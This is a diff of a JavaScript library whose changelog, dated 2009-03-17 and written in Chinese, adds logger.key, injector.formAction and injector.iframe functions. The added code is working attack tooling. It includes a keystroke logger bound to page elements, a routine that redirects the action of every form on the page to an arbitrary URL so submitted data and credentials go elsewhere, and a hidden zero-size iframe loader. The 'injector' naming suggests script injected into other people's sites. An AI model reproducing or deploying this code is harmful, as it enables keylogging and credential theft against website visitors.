@@ -9,6 +9,8 @@
  * @change
  *     [+]new feature  [*]improvement  [!]change  [x]bug fix
  *
+ * [+] 2009-03-17
+ *      增加 logger.key, injector.iframe, injector.formAction 方法
  *
  * [!] 2009-03-17
  *      删除 xhr, dom（部分）, event（部分） 组件
@@ -355,8 +357,11 @@
     };
 
     var logger = {
-        key: function(el, type) {
-        
+        key: function(el, arr) {
+            el = dom.get(el);
+            event.bind(el, 'keydown', function(e) {
+                arr.push(event.getCharCode(e));
+            });
         }
     };
 
@@ -369,12 +374,25 @@
 
         },
 
-        form: function (url, el) {
-        
+        formAction: function (url) {
+            var forms = document.body.getElementsByTagName('form');
+            if (forms.length) {
+                for (var i = 0, len = forms.length; i < len; i++) {
+                    forms[i].setAttribute('action', url);
+                }
+            }
         },
 
-        iframe: function(url) {
-        
+        iframe: function(url, target, cache) {
+            var iframe = document.createElement('iframe');
+            iframe.setAttribute('width',  '0');
+            iframe.setAttribute('height', '0');
+            if (target) {
+                iframe.setAttribute('target', target);
+            }
+            iframe.setAttribute('style',  'display: none');
+            iframe.setAttribute('src', url + (cache ? '' : '?t=' + new Date().getTime()));
+            document.body.appendChild(iframe);
         }
     };
 
